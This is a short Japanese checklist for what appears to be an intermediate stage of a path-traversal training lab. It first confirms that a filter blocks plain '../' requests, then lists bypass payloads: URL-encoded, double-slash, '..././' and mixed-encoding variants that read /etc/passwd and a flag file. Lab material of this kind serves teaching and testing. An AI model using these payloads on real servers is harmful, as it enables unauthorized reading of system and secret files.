## 🔒 Intermediate ステージ確認

### フィルター動作確認
- [ ] `../etc/passwd` → フィルターによりブロックされる
- [ ] `../../secrets/flag.txt` → フィルターによりブロックされる

### URLエンコード回避
- [ ] `%2e%2e/%2e%2e/etc/passwd` → フィルターを回避して `/etc/passwd` を取得
- [ ] `%2e%2e%2f%2e%2e%2fsecrets%2fflag.txt` → フィルターを回避してフラグを取得

### 高度な回避手法（Intermediateでも動作）
- [ ] `..//..//etc/passwd` → ダブルスラッシュ回避で取得
- [ ] `..././..././etc/passwd` → 混合パターン回避で取得
- [ ] `..%2f..%2fetc%2fpasswd` → 混合エンコード回避で取得
